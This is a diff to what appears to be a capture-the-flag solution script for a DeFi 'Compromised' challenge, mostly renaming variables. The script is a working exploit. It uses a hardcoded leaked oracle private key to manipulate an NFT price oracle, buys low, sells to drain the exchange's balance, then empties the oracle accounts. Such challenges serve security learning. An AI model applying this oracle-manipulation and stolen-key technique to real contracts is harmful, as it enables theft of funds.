@@ -71,7 +71,7 @@ describe('Compromised challenge', function () {
      * 5. sellOne(id)
      **/
 
-    const source1= new ethers.Wallet(
+    const source1 = new ethers.Wallet(
       "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
       ethers.provider
     );
@@ -102,34 +102,34 @@ describe('Compromised challenge', function () {
       await oracle.connect(source2).postPrice("DVNFT", newPrice);
     }
 
-    await printPrices(this.oracle);
+    await printPrices(oracle);
 
     newPrice = 1;
-    await changePrice(this.oracle, newPrice);
-    await printPrices(this.oracle);
+    await changePrice(oracle, newPrice);
+    await printPrices(oracle);
 
-    let tx = await this.exchange.connect(attacker).buyOne({ value: newPrice });
+    let tx = await exchange.connect(player).buyOne({ value: newPrice });
     let rc = await tx.wait();
     const event = rc.events.find((event) => event.event === "TokenBought");
     const [, tokenId] = event.args;
 
-    newPrice = await ethers.provider.getBalance(this.exchange.address);
+    newPrice = await ethers.provider.getBalance(exchange.address);
 
-    await changePrice(this.oracle, newPrice);
-    await printPrices(this.oracle);
+    await changePrice(oracle, newPrice);
+    await printPrices(oracle);
 
-    await this.nftToken
-      .connect(attacker)
-      .approve(this.exchange.address, tokenId);
-    await this.exchange.connect(attacker).sellOne(tokenId);
+    await nftToken
+      .connect(player)
+      .approve(exchange.address, tokenId);
+    await exchange.connect(player).sellOne(tokenId);
 
-    await changePrice(this.oracle, INITIAL_NFT_PRICE);
+    await changePrice(oracle, INITIAL_NFT_PRICE);
 
     async function drainAcc(source) {
         sourceBalance = await ethers.provider.getBalance(source.address);
 
         gasEstimation = await ethers.provider.estimateGas({
-          to: attacker.address,
+          to: player.address,
           value: sourceBalance,
         });
     
@@ -146,7 +146,7 @@ describe('Compromised challenge', function () {
         `);
         try {
           await source.sendTransaction({
-            to: attacker.address,
+            to: player.address,
             value: sourceBalance.sub(costEstimation),
             gasLimit: gasEstimation.toString(),
           });
